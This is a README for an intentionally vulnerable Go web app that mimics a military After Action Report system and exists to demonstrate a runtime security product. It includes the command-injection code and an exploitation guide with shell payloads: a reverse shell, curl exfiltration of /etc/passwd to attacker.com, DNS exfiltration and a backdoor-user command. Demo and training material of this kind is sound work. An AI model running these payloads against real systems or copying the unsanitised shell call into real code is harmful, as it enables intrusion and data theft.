# After Action Report (AAR) Management System

A demonstration web application built with Go featuring server-side rendered HTML for showcasing runtime security technology. This application simulates a Defense/Military After Action Report management system with S3 integration and contains an **intentional command injection vulnerability** for security demonstration purposes.

## ⚠️ SECURITY WARNING

**THIS APPLICATION CONTAINS AN INTENTIONAL REMOTE CODE EXECUTION (RCE) VULNERABILITY**

This application is designed for **security demonstrations only** and should **NEVER** be deployed in production environments. The vulnerability is present in the PDF report generation feature and is used to demonstrate runtime security protection capabilities.

## 🎯 Purpose

This application is designed to:
- Demonstrate runtime security technology to Federal and Defense sector buyers
- Provide a realistic Defense/Military workflow (After Action Reports)
- Exercise S3 connectivity with sensitive document storage
- Contain an exploitable RCE vulnerability for runtime protection demos

## 📋 Features

### Core Functionality
1. **Create After Action Reports** - Form-based AAR creation with Defense-standard fields
2. **Browse & Search AARs** - Filter by operation name, unit, and mission type
3. **View AAR Details** - Full detail view with all metadata and attachments
4. **S3 Document Storage** - Upload and download attachments from S3-compatible storage
5. **PDF Report Generation** - Generate formatted PDF reports (⚠️ **Contains RCE vulnerability**)

### Defense/Military Authenticity
- Classification banners (UNCLASSIFIED // FOUO)
- Military terminology (DTG, AO, Unit Designation, etc.)
- DoD color scheme (Navy blue #002F6C, Gray #4A4A4A)
- Realistic AAR structure and workflow
- Pre-populated sample military operations

## 🏗️ Architecture

- **Language**: Go 1.21+
- **Web Framework**: Go standard library (`net/http`, `html/template`)
- **Storage**: In-memory (no database required)
- **S3 SDK**: AWS SDK for Go v2
- **PDF Generation**: wkhtmltopdf (external dependency)

## 📁 Project Structure

```
hs-s3-app/
├── main.go                    # Entry point and HTTP server
├── go.mod                     # Go module definition
├── handlers/                  # HTTP request handlers
│   ├── home.go               # Dashboard
│   ├── aar_create.go         # Create AAR with S3 uploads
│   ├── aar_list.go           # Browse/search AARs
│   ├── aar_detail.go         # View AAR details with downloads
│   └── aar_report.go         # PDF generation (⚠️ RCE vulnerability)
├── models/                    # Data structures
│   └── aar.go                # AAR model with Defense fields
├── storage/                   # Data persistence
│   └── memory.go             # In-memory storage with sample data
├── s3/                        # S3 operations
│   └── client.go             # S3 upload/download/list
├── templates/                 # HTML templates
│   ├── layout.html           # Base layout with classification banners
│   ├── dashboard.html        # Homepage with statistics
│   ├── create.html           # AAR creation form
│   ├── list.html             # AAR table view with search
│   └── detail.html           # AAR detail page with attachments
└── static/                    # Static assets
    └── style.css             # Defense-themed CSS
```

## 🚀 Quick Start

### Prerequisites

1. **Go 1.21 or higher**
   ```bash
   go version
   ```

2. **wkhtmltopdf** (required for PDF generation vulnerability)
   ```bash
   # Ubuntu/Debian
   sudo apt-get update
   sudo apt-get install wkhtmltopdf

   # macOS
   brew install wkhtmltopdf

   # Verify installation
   wkhtmltopdf --version
   ```

3. **S3-Compatible Storage** (REQUIRED - MinIO, AWS S3, etc.)
   - Endpoint URL (optional for AWS S3)
   - Access Key (required)
   - Secret Key (required)
   - Bucket name (required)
   - Region (optional, defaults to us-east-1)

   **Note**: The application will not start without valid S3 configuration.

### Installation

1. **Clone or navigate to the project directory**
   ```bash
   cd /path/to/hs-s3-app
   ```

2. **Install Go dependencies**
   ```bash
   go mod download
   ```

3. **Set up S3 storage (REQUIRED)**

   **Option A: Local MinIO (Recommended for testing)**
   ```bash
   # Terminal 1: Start MinIO
   docker run -p 9000:9000 -p 9001:9001 \
     -e MINIO_ROOT_USER=minioadmin \
     -e MINIO_ROOT_PASSWORD=minioadmin \
     minio/minio server /data --console-address ":9001"

   # Terminal 2: Create bucket
   aws s3 mb s3://aar-documents --endpoint-url http://localhost:9000

   # Set environment variables
   export S3_ENDPOINT="http://localhost:9000"
   export S3_ACCESS_KEY="minioadmin"
   export S3_SECRET_KEY="minioadmin"
   export S3_BUCKET="aar-documents"
   export S3_REGION="us-east-1"
   ```

   **Option B: AWS S3**
   ```bash
   # Create bucket (if needed)
   aws s3 mb s3://your-bucket-name --region us-east-1

   # Set environment variables (leave S3_ENDPOINT empty for AWS)
   export S3_ENDPOINT=""
   export S3_ACCESS_KEY="your-aws-access-key"
   export S3_SECRET_KEY="your-aws-secret-key"
   export S3_BUCKET="your-bucket-name"
   export S3_REGION="us-east-1"
   ```

   **Note on Self-Signed Certificates**: The S3 client is configured to accept self-signed certificates, making it compatible with MinIO and other S3-compatible services using self-signed certs. See `S3_SELF_SIGNED_CERTS.md` for security implications and production recommendations.

4. **Run the application**
   ```bash
   go run main.go
   # or use the compiled binary
   ./aar-system
   ```

   The application will validate S3 configuration and fail to start if S3 is not properly configured.

5. **Access the application**
   ```
   http://localhost:8080
   ```

## 🔧 Configuration

### Environment Variables

| Variable | Description | Required | Default |
|----------|-------------|----------|---------|
| `S3_ENDPOINT` | S3 endpoint URL (e.g., http://localhost:9000). Leave empty for AWS S3. | For non-AWS | - |
| `S3_ACCESS_KEY` | S3 access key | **Yes** | - |
| `S3_SECRET_KEY` | S3 secret key | **Yes** | - |
| `S3_BUCKET` | S3 bucket name | **Yes** | - |
| `S3_REGION` | S3 region | No | us-east-1 |
| `PORT` | HTTP server port | No | 8080 |

**Important**: S3 configuration is mandatory. The application will fail to start with detailed diagnostic information if S3 is not properly configured or if the connection fails.

## 🎭 Pre-Populated Sample Data

The application comes with 4 pre-populated After Action Reports:

1. **AAR-20251005-0001** - Operation Enduring Shield (Training Exercise)
2. **AAR-20250920-0002** - Exercise Iron Sentinel (Security Cooperation)
3. **AAR-20251107-0003** - Operation Phantom Strike ⚠️ **Contains Exploit Payload**
4. **AAR-20250815-0004** - Exercise Northern Viking (Cold Weather Training)

## 🐛 The Vulnerability: Command Injection

### Location
`handlers/aar_report.go` - PDF report generation function

### Vulnerability Type
Command Injection (CWE-77, CWE-78)

### Technical Details

The `GenerateReportHandler` function uses `wkhtmltopdf` to generate PDF reports. The vulnerability exists because the **Operation Name** field is directly interpolated into a shell command without sanitization:

```go
// VULNERABLE CODE (line ~47 in handlers/aar_report.go)
cmdStr := fmt.Sprintf("wkhtmltopdf --title '%s' %s %s",
    aar.OperationName,  // USER-CONTROLLED INPUT - NOT SANITIZED
    tmpHTMLFile,
    tmpPDFFile)

cmd := exec.Command("sh", "-c", cmdStr)
output, err := cmd.CombinedOutput()  // EXECUTES ARBITRARY COMMANDS
```

### Attack Vector

An attacker can create an AAR with a malicious Operation Name that includes shell metacharacters to break out of the command and execute arbitrary code:

**Example Payload**:
```
Operation Phantom Strike'; curl http://attacker.com/exfil?data=$(whoami); echo 'Complete
```

**Resulting Command**:
```bash
wkhtmltopdf --title 'Operation Phantom Strike'; curl http://attacker.com/exfil?data=$(whoami); echo 'Complete' /tmp/report.html /tmp/output.pdf
```

This executes three commands:
1. `wkhtmltopdf --title 'Operation Phantom Strike'` (fails but continues)
2. `curl http://attacker.com/exfil?data=$(whoami)` (exfiltrates username)
3. `echo 'Complete' /tmp/report.html /tmp/output.pdf` (benign)

## 🎯 Exploitation Guide

### Demo Scenario: Operation Phantom Strike

The pre-populated AAR "Operation Phantom Strike" already contains an exploit payload for easy demonstration.

### Step-by-Step Exploitation

#### 1. **Navigate to the Application**
```
http://localhost:8080
```

#### 2. **Browse to "Operation Phantom Strike"**
- Click "Browse AARs" in the navigation
- Find **AAR-20251107-0003 - Operation Phantom Strike**
- Click "View" to see the AAR details

#### 3. **Trigger the Vulnerability**
- Click the **"Generate PDF Report"** button
- The server executes the command injection payload

#### 4. **Observe the Attack**

**Without Runtime Protection**:
- Command executes successfully
- Reverse shell established (if payload configured)
- Data exfiltration occurs
- Server may show error (PDF generation fails, but command executes)

**With Runtime Protection** (Your Demo):
- Runtime sensor detects command execution
- Execution is blocked before command runs
- Security alert is logged
- User sees error message (safe failure)

### Exploitation Payload Examples

#### Example 1: Reverse Shell
```
Operation Phoenix'; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; echo 'Strike
```

#### Example 2: DNS Exfiltration
```
Operation Shadow'; nslookup $(whoami).attacker.com; echo 'Ops
```

#### Example 3: File Exfiltration
```
Operation Ghost'; curl -X POST -d @/etc/passwd http://attacker.com/collect; echo 'Mission
```

#### Example 4: Credential Harvesting
```
Operation Silent'; cat /etc/passwd | base64 | curl -d @- http://attacker.com/data; echo 'Thunder
```

#### Example 5: Create Backdoor User
```
Operation Dark'; useradd -m -p $(openssl passwd -1 password) backdoor; echo 'Knight
```

### Creating a New Exploited AAR

To demonstrate the vulnerability from scratch:

1. Navigate to **"Create AAR"**
2. Fill in the form with:
   - **Operation Name**: `Test Op'; curl http://your-server.com?pwned=$(whoami); echo 'Success`
   - Fill in other required fields normally
3. Submit the AAR
4. Navigate to the newly created AAR
5. Click **"Generate PDF Report"**
6. Monitor your server for the incoming request with exfiltrated data

## 🛡️ Runtime Security Demo Script

### Demo Flow for Federal/Defense Buyers

#### Part 1: Application Overview (2 minutes)
1. Show the dashboard - explain the realistic Defense workflow
2. Browse through sample AARs - highlight S3 document storage
3. Explain the use case: "This is how Defense organizations manage operational reports"

#### Part 2: The Threat (3 minutes)
1. Navigate to "Operation Phantom Strike"
2. Show the Operation Name field in the detail view
3. Explain: "Notice this operation name has unusual characters - this is our malicious payload"
4. Click "Generate PDF Report" button
5. **Without Protection**: Show command execution, server compromise, data exfiltration
6. Explain impact: "Attacker now has remote code execution on your server"

#### Part 3: Runtime Protection (5 minutes)
1. Enable your runtime security sensor
2. Repeat the attack: Navigate to "Operation Phantom Strike"
3. Click "Generate PDF Report" again
4. **With Protection**: Show that execution is blocked
5. Display runtime security dashboard showing:
   - Command injection attempt detected
   - Process blocked: `sh -c wkhtmltopdf --title '...'`
   - Alert severity: CRITICAL
   - Attack prevented in real-time (not after breach)
6. Emphasize: "Zero-day vulnerability, no signature available, but still blocked"

#### Part 4: Why This Matters for Defense (3 minutes)
1. Explain: "This demonstrates protection against unknown vulnerabilities"
2. Highlight key points:
   - Application code contained vulnerability (developer mistake)
   - Static analysis might miss this (indirect command construction)
   - WAF/network security wouldn't catch this (legitimate HTTP POST)
   - Runtime protection stopped the actual malicious behavior
3. Show application logs: normal operations continue, attack is isolated
4. Discuss compliance: FedRAMP, NIST 800-53, Zero Trust architecture

### Key Talking Points

✅ **Real-time Protection**: Blocks attacks as they happen, not after breach
✅ **Zero-Day Defense**: No signatures needed - behavioral detection
✅ **Application Aware**: Understands application context and intent
✅ **Cloud Native**: Works with S3, containers, serverless
✅ **Minimal Performance Impact**: Microseconds of overhead
✅ **Defense in Depth**: Complements existing security controls

## 🔍 Debugging & Troubleshooting

### Application won't start

**Error**: `bind: address already in use`
```bash
# Change the port
export PORT=8081
go run main.go
```

### wkhtmltopdf not found

**Error**: `exec: "wkhtmltopdf": executable file not found`
```bash
# Install wkhtmltopdf
sudo apt-get install wkhtmltopdf  # Ubuntu/Debian
brew install wkhtmltopdf          # macOS
```

### S3 connection errors

**Error**: `failed to upload file to S3`
```bash
# Verify S3 credentials
echo $S3_ENDPOINT
echo $S3_ACCESS_KEY

# Test S3 connection with AWS CLI
aws s3 ls --endpoint-url $S3_ENDPOINT
```

### Template errors

**Error**: `Error loading template`
```bash
# Ensure you're running from the project root directory
cd /path/to/hs-s3-app
go run main.go
```

## 📊 Demo Metrics

Use these metrics to highlight the security value:

| Metric | Value | Significance |
|--------|-------|--------------|
| Time to Exploit | < 30 seconds | Shows how quickly attackers can compromise vulnerable apps |
| CVSS Score | 9.8 (Critical) | Command injection with network access is severe |
| Detection Time (Traditional) | Days to Weeks | WAF/IDS won't see this, forensics takes time |
| Detection Time (Runtime) | Microseconds | Real-time behavioral analysis |
| Prevention (Without Protection) | 0% | Application is completely compromised |
| Prevention (With Runtime) | 100% | Attack blocked, application continues safely |

## 🛠️ Customization

### Adding More Payloads

Edit `storage/memory.go` to add additional sample AARs with different payloads:

```go
aar5 := &models.AAR{
    // ... other fields ...
    OperationName: "Custom Op'; your-payload-here; echo 'Complete",
    // ... other fields ...
}
s.aars[aar5.ID] = aar5
```

### Changing the Vulnerability

The vulnerability is isolated in `handlers/aar_report.go`. You can:
- Change the vulnerable field (e.g., use `UnitDesignation` instead)
- Modify the command being executed
- Add additional attack vectors

## 📚 Additional Resources

### Defense Compliance Frameworks
- NIST 800-53 - Security and Privacy Controls
- FedRAMP - Federal Risk and Authorization Management Program
- DISA STIGs - Security Technical Implementation Guides
- DoD Cloud Computing SRG - Security Requirements Guide

### Related Vulnerability Classes
- CWE-77: Improper Neutralization of Special Elements used in a Command
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-88: Improper Neutralization of Argument Delimiters in a Command
- OWASP A03:2021 - Injection

## 📄 License

This is a demonstration application for security training purposes only. Not licensed for production use.

## ⚖️ Legal Disclaimer

This application contains intentional security vulnerabilities for authorized security testing and demonstration purposes only. Users of this application:

- Must only use this application in controlled, isolated environments
- Must not deploy this application in production systems
- Must not use this application to attack systems without explicit authorization
- Assume all responsibility for any misuse or unauthorized access
- Acknowledge that the developers are not liable for any damages or legal consequences

This application is provided "as is" without warranty of any kind.

## 👥 Support

For questions about this demo application, contact your Endura security representative.

---

**Built for Endura Runtime Security Demonstrations**
**Version 1.0**
**Classification: UNCLASSIFIED // FOR OFFICIAL USE ONLY (FOUO)**
